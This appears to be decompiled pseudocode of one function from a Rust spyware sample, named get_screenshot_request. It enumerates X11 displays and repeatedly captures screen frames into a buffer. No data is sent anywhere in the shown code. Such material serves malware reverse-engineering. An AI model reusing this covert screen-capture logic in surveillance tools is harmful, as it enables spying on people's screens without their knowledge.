__int64 __fastcall spyware::actions::screenshot_actions::get_screenshot_request(__int64 a1)
{
  __int64 v2; // [rsp+8h] [rbp-180h] BYREF
  __int128 v3; // [rsp+10h] [rbp-178h] BYREF
  __int128 *v4; // [rsp+20h] [rbp-168h]
  __m128i v5; // [rsp+28h] [rbp-160h]
  __int128 v6; // [rsp+58h] [rbp-130h] BYREF
  __int64 v7; // [rsp+68h] [rbp-120h]
  __int64 v8; // [rsp+70h] [rbp-118h] BYREF
  __int64 v9; // [rsp+78h] [rbp-110h]
  __m128i v10; // [rsp+80h] [rbp-108h] BYREF
  const char *v11; // [rsp+90h] [rbp-F8h]
  __int128 v12; // [rsp+98h] [rbp-F0h] BYREF
  __int128 *v13; // [rsp+A8h] [rbp-E0h]
  __m128i v14; // [rsp+B0h] [rbp-D8h] BYREF
  const char *v15; // [rsp+C0h] [rbp-C8h]
  __int64 v16; // [rsp+C8h] [rbp-C0h]
  __int64 v17; // [rsp+D0h] [rbp-B8h]
  __m128i v18; // [rsp+F8h] [rbp-90h] BYREF
  const char *v19; // [rsp+108h] [rbp-80h]
  __m128i v20; // [rsp+110h] [rbp-78h] BYREF
  _BYTE v21[32]; // [rsp+120h] [rbp-68h] BYREF
  _BYTE v22[72]; // [rsp+140h] [rbp-48h] BYREF

  *(_QWORD *)&v6 = 0LL;
  *((_QWORD *)&v6 + 1) = 8LL;
  v7 = 0LL;
  if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 4 )
  {
    *(_QWORD *)&v3 = &off_B9F08;
    *((_QWORD *)&v3 + 1) = 1LL;
    v4 = (_OWORD *)&byte_8;
    v5 = 0LL;
    v14.m128i_i64[0] = (__int64)aSpywareActions_1;
    v14.m128i_i64[1] = 36LL;
    v15 = aSpywareActions_1;
    v16 = 36LL;
    v17 = log::__private_api::loc(&off_B9F38);
    log::__private_api::log(&v3, 4LL, &v14);
  }
  scrap::common::x11::Display::all(&v3);
  core::result::Result<T,E>::expect(v22, &v3);
  <alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(v21, v22);
  <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v18, v21);
  if ( BYTE4(v19) != 2 )
  {
    v11 = v19;
    v10 = _mm_loadu_si128(&v18);
    *(_QWORD *)&v3 = &off_B9F18;
    *((_QWORD *)&v3 + 1) = 1LL;
    v4 = (_OWORD *)&byte_8;
    v5 = 0LL;
    std::io::stdio::_print(&v3);
    v15 = v11;
    v14 = _mm_load_si128(&v10);
    scrap::common::x11::Capturer::new(&v3, &v14);
    core::result::Result<T,E>::expect(&v14, &v3);
    v20 = _mm_unpacklo_epi32(_mm_unpacklo_epi16(_mm_cvtsi32_si128(HIDWORD(v17)), (__m128i)0LL), (__m128i)0LL);
    while ( 1 )
    {
      while ( 1 )
      {
        scrap::common::x11::Capturer::frame(&v8, &v14);
        if ( !v8 )
          break;
        <T as alloc::slice::hack::ConvertVec>::to_vec(&v12, v8, v9);
        v4 = v13;
        v3 = v12;
        v5 = _mm_load_si128(&v20);
        alloc::vec::Vec<T,A>::push(&v6, &v3);
      }
      v2 = v9;
      if ( (unsigned __int8)std::io::error::Error::kind() != 13 )
      {
        *(_QWORD *)&v12 = &v2;
        *((_QWORD *)&v12 + 1) = <std::io::error::Error as core::fmt::Display>::fmt;
        *(_QWORD *)&v3 = &off_B9F28;
        *((_QWORD *)&v3 + 1) = 1LL;
        v4 = &v12;
        v5 = (__m128i)1uLL;
        core::panicking::panic_fmt(&v3, &off_B9F98);
      }
      std::thread::sleep(0LL, 16666666LL);
      core::ptr::drop_in_place<std::io::error::Error>(&v2);
    }
  }
  core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<scrap::common::x11::Display>>(v21);
  *(_QWORD *)(a1 + 16) = v7;
  *(_OWORD *)a1 = v6;
  *(_QWORD *)(a1 + 24) = 0x8000000000000000LL;
  return a1;
}